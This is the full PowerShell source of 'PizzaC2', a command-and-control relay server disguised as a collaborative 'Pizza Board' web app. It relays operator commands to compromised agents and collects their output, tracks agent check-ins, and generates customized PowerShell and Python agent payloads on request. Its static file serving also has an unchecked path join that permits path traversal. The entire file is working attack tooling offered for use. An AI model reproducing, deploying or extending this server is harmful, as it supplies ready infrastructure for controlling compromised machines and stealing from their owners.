<#
.SYNOPSIS
    PizzaC2 - LOTS (Living Off Trusted Sites) C2 Relay Server
    PowerShell Native HTTP Server for Pizza Board C2

.DESCRIPTION
    Hosts the Pizza web interface and provides REST API endpoints for:
    - Real-time room synchronization
    - Sticker command & response relay
    - Target agent presence tracking
    - Dynamic agent payload generation (PowerShell & Python)
#>

param(
    [int]$Port = 8080,
    [string]$HostAddress = "127.0.0.1"
)

$ErrorActionPreference = "Continue"

# In-Memory Database for Pizza Rooms
$Global:Rooms = @{}
$Global:RoomNotes = @{}
$Global:RoomNoteCounts = @{}
$Global:RoomPresence = @{}

# ASCII Banner
Clear-Host
Write-Host @"
===================================================================
  ____  _                 ____ ____  
 |  _ \(_)___________ _  / ___|___ \ 
 | |_) | |_  /_  / _` | | |     __) |
 |  __/| |/ / / / (_| | | |___ / __/ 
 |_|   |_/___/___\__,_|  \____|_____|
  LOTS (Living Off Trusted Sites) C2 Server
===================================================================
[*] Relay Server & Pizza Board Web App
[*] URL: http://$HostAddress`:$Port/
[*] C2 API: http://$HostAddress`:$Port/api/
[*] Press Ctrl+C to stop the server
===================================================================
"@ -ForegroundColor Yellow

$Listener = New-Object System.Net.HttpListener
$Prefix = "http://$HostAddress`:$Port/"
$Listener.Prefixes.Add($Prefix)

try {
    $Listener.Start()
    Write-Host "[+] Server successfully listening on $Prefix" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to start listener on $($Prefix) - $_" -ForegroundColor Red
    Write-Host "[*] Tip: You may need administrative privileges to bind to 0.0.0.0 or check if port $Port is already in use." -ForegroundColor Yellow
    exit 1
}

# Helper to send HTTP JSON response
function Send-JsonResponse($response, $data, [int]$statusCode = 200) {
    $json = $data | ConvertTo-Json -Depth 10 -Compress
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
    $response.StatusCode = $statusCode
    $response.ContentType = "application/json; charset=utf-8"
    $response.ContentLength64 = $buffer.Length
    $response.Headers.Add("Access-Control-Allow-Origin", "*")
    $response.Headers.Add("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
    $response.Headers.Add("Access-Control-Allow-Headers", "Content-Type, Authorization")
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
    $response.OutputStream.Close()
}

# Helper to send plain text or script response
function Send-TextResponse($response, [string]$text, [string]$contentType = "text/plain; charset=utf-8", [int]$statusCode = 200) {
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($text)
    $response.StatusCode = $statusCode
    $response.ContentType = $contentType
    $response.ContentLength64 = $buffer.Length
    $response.Headers.Add("Access-Control-Allow-Origin", "*")
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
    $response.OutputStream.Close()
}

# Helper to read request body
function Read-RequestBody($request) {
    if (-not $request.HasEntityBody) { return $null }
    $enc = if ($request.ContentEncoding) { $request.ContentEncoding } else { [System.Text.Encoding]::UTF8 }
    $reader = New-Object System.IO.StreamReader($request.InputStream, $enc)
    $body = $reader.ReadToEnd()
    $reader.Close()
    if ($body -and $body.Trim().Length -gt 0) {
        try {
            return ($body | ConvertFrom-Json)
        } catch {
            return $body
        }
    }
    return $null
}

# Helper to serve static files
function Send-StaticFile($response, [string]$filePath) {
    if (-not (Test-Path $filePath)) {
        Send-TextResponse $response "404 Not Found" "text/plain" 404
        return
    }
    $bytes = [System.IO.File]::ReadAllBytes($filePath)
    $ext = [System.IO.Path]::GetExtension($filePath).ToLower()
    $contentType = switch ($ext) {
        ".html" { "text/html; charset=utf-8" }
        ".css"  { "text/css; charset=utf-8" }
        ".js"   { "application/javascript; charset=utf-8" }
        ".json" { "application/json; charset=utf-8" }
        ".png"  { "image/png" }
        ".jpg"  { "image/jpeg" }
        ".ico"  { "image/x-icon" }
        default { "application/octet-stream" }
    }
    $response.StatusCode = 200
    $response.ContentType = $contentType
    $response.ContentLength64 = $bytes.Length
    $response.Headers.Add("Access-Control-Allow-Origin", "*")
    $response.OutputStream.Write($bytes, 0, $bytes.Length)
    $response.OutputStream.Close()
}

# Clean expired presences periodically
function Clean-ExpiredPresence {
    $now = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    foreach ($code in $Global:RoomPresence.Keys) {
        $dict = $Global:RoomPresence[$code]
        if ($dict) {
            $expiredKeys = @()
            foreach ($uid in $dict.Keys) {
                if (($now - $dict[$uid].lastSeen) -gt 15000) {
                    $expiredKeys += $uid
                }
            }
            foreach ($k in $expiredKeys) {
                $dict.Remove($k)
            }
        }
    }
}

$CurrentDir = $PSScriptRoot
if (-not $CurrentDir) { $CurrentDir = Get-Location }

Write-Host "[*] Serving static files from: $CurrentDir" -ForegroundColor Cyan

while ($Listener.IsListening) {
    try {
        $context = $Listener.GetContext()
        $request = $context.Request
        $response = $context.Response

        $path = $request.Url.AbsolutePath
        $method = $request.HttpMethod
        $query = $request.Url.Query

        # Handle CORS Preflight
        if ($method -eq "OPTIONS") {
            $response.StatusCode = 204
            $response.Headers.Add("Access-Control-Allow-Origin", "*")
            $response.Headers.Add("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
            $response.Headers.Add("Access-Control-Allow-Headers", "Content-Type, Authorization")
            $response.OutputStream.Close()
            continue
        }

        Clean-ExpiredPresence

        # API Router
        if ($path.StartsWith("/api/")) {
            # GET /api/status
            if ($path -eq "/api/status" -and $method -eq "GET") {
                Send-JsonResponse $response @{
                    status = "ok"
                    mode = "pizzac2"
                    timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                    activeRooms = $Global:Rooms.Count
                }
                continue
            }

            # GET /api/rooms
            if ($path -eq "/api/rooms" -and $method -eq "GET") {
                Send-JsonResponse $response @{ rooms = $Global:Rooms.Values }
                continue
            }

            # POST /api/rooms
            if ($path -eq "/api/rooms" -and $method -eq "POST") {
                $body = Read-RequestBody $request
                if ($body -and $body.code) {
                    $code = [string]$body.code
                    $Global:Rooms[$code] = @{
                        code = $code
                        adminCode = [string]$body.adminCode
                        host = [string]$body.host
                        createdAt = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                        active = $true
                    }
                    if (-not $Global:RoomNotes.ContainsKey($code)) {
                        $Global:RoomNotes[$code] = [System.Collections.ArrayList]::new()
                        $Global:RoomNoteCounts[$code] = 0
                    }
                    if (-not $Global:RoomPresence.ContainsKey($code)) {
                        $Global:RoomPresence[$code] = @{}
                    }
                    Write-Host "[+] [Room Created] Code: $code (Admin: $($body.adminCode))" -ForegroundColor Green
                    Send-JsonResponse $response @{ success = $true; room = $Global:Rooms[$code] }
                } else {
                    Send-JsonResponse $response @{ error = "Invalid room data" } 400
                }
                continue
            }

            # Room-specific APIs: /api/rooms/{code}/...
            if ($path -match "^/api/rooms/(\d{6})(/.*)?$") {
                $code = $matches[1]
                $subPath = $matches[2]

                # Ensure room exists or auto-register if requested
                if (-not $Global:Rooms.ContainsKey($code)) {
                    $Global:Rooms[$code] = @{
                        code = $code
                        adminCode = ""
                        host = "Host"
                        createdAt = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                        active = $true
                    }
                    $Global:RoomNotes[$code] = [System.Collections.ArrayList]::new()
                    $Global:RoomNoteCounts[$code] = 0
                    $Global:RoomPresence[$code] = @{}
                }

                # GET /api/rooms/{code}
                if ([string]::IsNullOrEmpty($subPath) -or $subPath -eq "/") {
                    if ($method -eq "GET") {
                        Send-JsonResponse $response @{ exists = $true; room = $Global:Rooms[$code] }
                    } elseif ($method -eq "DELETE") {
                        $Global:Rooms.Remove($code)
                        $Global:RoomNotes.Remove($code)
                        $Global:RoomNoteCounts.Remove($code)
                        $Global:RoomPresence.Remove($code)
                        Write-Host "[-] [Room Deleted] Code: $code" -ForegroundColor Red
                        Send-JsonResponse $response @{ success = $true }
                    }
                    continue
                }

                # /api/rooms/{code}/notes
                if ($subPath -eq "/notes") {
                    if ($method -eq "GET") {
                        $notes = $Global:RoomNotes[$code]
                        Send-JsonResponse $response @{ notes = $notes }
                    } elseif ($method -eq "POST") {
                        $body = Read-RequestBody $request
                        if ($body -and $body.text) {
                            $Global:RoomNoteCounts[$code]++
                            $num = $Global:RoomNoteCounts[$code]
                            $noteId = if ($body.id) { [string]$body.id } else { "$code-$num-$(Get-Random)" }
                            $author = if ($body.author) { [string]$body.author } else { "Anonymous" }
                            $text = [string]$body.text

                            $isCmd = $text.StartsWith("!") -or $text.StartsWith("[CMD]")
                            $isRes = $text.StartsWith("[RES]") -or $text.StartsWith("[OUTPUT]")

                            $noteObj = @{
                                id = $noteId
                                number = $num
                                author = $author
                                text = $text
                                timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                                isCommand = $isCmd
                                isResponse = $isRes
                            }

                            [void]$Global:RoomNotes[$code].Add($noteObj)

                            if ($isCmd) {
                                Write-Host "[!] [C2 COMMAND POSTED] Room: $code | By: $author | Cmd: $text" -ForegroundColor Magenta
                            } elseif ($isRes) {
                                Write-Host "[*] [C2 AGENT RESPONSE] Room: $code | From: $author | Output received!" -ForegroundColor Cyan
                            } else {
                                Write-Host "[i] [Note Added] Room: $code | By: $author | #$num" -ForegroundColor Gray
                            }

                            Send-JsonResponse $response @{ success = $true; note = $noteObj }
                        } else {
                            Send-JsonResponse $response @{ error = "Note text required" } 400
                        }
                    }
                    continue
                }

                # /api/rooms/{code}/notes/{id}
                if ($subPath -match "^/notes/(.+)$") {
                    $targetId = $matches[1]
                    $noteList = $Global:RoomNotes[$code]
                    if ($method -eq "DELETE") {
                        $indexToRemove = -1
                        for ($i = 0; $i -lt $noteList.Count; $i++) {
                            if ($noteList[$i].id -eq $targetId) {
                                $indexToRemove = $i
                                break
                            }
                        }
                        if ($indexToRemove -ge 0) {
                            $noteList.RemoveAt($indexToRemove)
                            Send-JsonResponse $response @{ success = $true }
                        } else {
                            Send-JsonResponse $response @{ error = "Note not found" } 404
                        }
                        continue
                    }
                }

                # /api/rooms/{code}/presence
                if ($subPath -eq "/presence") {
                    if ($method -eq "GET") {
                        $presenceDict = $Global:RoomPresence[$code]
                        $list = @($presenceDict.Values)
                        Send-JsonResponse $response @{ presence = $list }
                    } elseif ($method -eq "POST") {
                        $body = Read-RequestBody $request
                        if ($body -and $body.id) {
                            $userId = [string]$body.id
                            $userName = if ($body.name) { [string]$body.name } else { "Guest" }
                            $isAgent = [bool]$body.isAgent
                            $isHost = [bool]$body.isHost

                            $existing = $Global:RoomPresence[$code][$userId]
                            if (-not $existing -and $isAgent) {
                                Write-Host "[+] [NEW AGENT CHECK-IN] Room: $code | Agent: $userName ($userId)" -ForegroundColor Yellow
                            }

                            $Global:RoomPresence[$code][$userId] = @{
                                id = $userId
                                code = $code
                                name = $userName
                                isHost = $isHost
                                isAgent = $isAgent
                                lastSeen = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
                            }

                            Send-JsonResponse $response @{ success = $true }
                        } else {
                            Send-JsonResponse $response @{ error = "ID required" } 400
                        }
                    }
                    continue
                }
            }

            # /api/agent/ps1?code=123456&server=...
            if ($path -eq "/api/agent/ps1") {
                $targetCode = if ($query -match "code=([^&]+)") { $matches[1] } else { "123456" }
                $targetServer = if ($query -match "server=([^&]+)") { [System.Uri]::UnescapeDataString($matches[1]) } else { "http://$($HostAddress):$Port" }

                $agentScriptPath = Join-Path $CurrentDir "agent.ps1"
                if (Test-Path $agentScriptPath) {
                    $template = [System.IO.File]::ReadAllText($agentScriptPath)
                    # Replace default params
                    $customized = $template -replace '(\$ServerUrl\s*=\s*")[^"]*(")', "`$1$targetServer`$2"
                    $customized = $customized -replace '(\$RoomCode\s*=\s*")[^"]*(")', "`$1$targetCode`$2"
                    Send-TextResponse $response $customized "text/plain; charset=utf-8"
                } else {
                    Send-TextResponse $response "# Agent template not found" "text/plain" 404
                }
                continue
            }

            # /api/agent/py?code=123456&server=...
            if ($path -eq "/api/agent/py") {
                $targetCode = if ($query -match "code=([^&]+)") { $matches[1] } else { "123456" }
                $targetServer = if ($query -match "server=([^&]+)") { [System.Uri]::UnescapeDataString($matches[1]) } else { "http://$($HostAddress):$Port" }

                $pyAgentPath = Join-Path $CurrentDir "agent.py"
                if (Test-Path $pyAgentPath) {
                    $template = [System.IO.File]::ReadAllText($pyAgentPath)
                    $customized = $template -replace '(SERVER_URL\s*=\s*")[^"]*(")', "`$1$targetServer`$2"
                    $customized = $customized -replace '(ROOM_CODE\s*=\s*")[^"]*(")', "`$1$targetCode`$2"
                    Send-TextResponse $response $customized "text/plain; charset=utf-8"
                } else {
                    Send-TextResponse $response "# Python agent template not found" "text/plain" 404
                }
                continue
            }

            Send-JsonResponse $response @{ error = "Unknown API endpoint" } 404
            continue
        }

        # Static File Serving (HTML, CSS, JS, Images)
        $relPath = $path.TrimStart("/")
        if ([string]::IsNullOrEmpty($relPath)) { $relPath = "index.html" }
        $fullPath = Join-Path $CurrentDir $relPath

        Send-StaticFile $response $fullPath

    } catch {
        Write-Host "[-] Request Error: $_" -ForegroundColor Red
    }
}
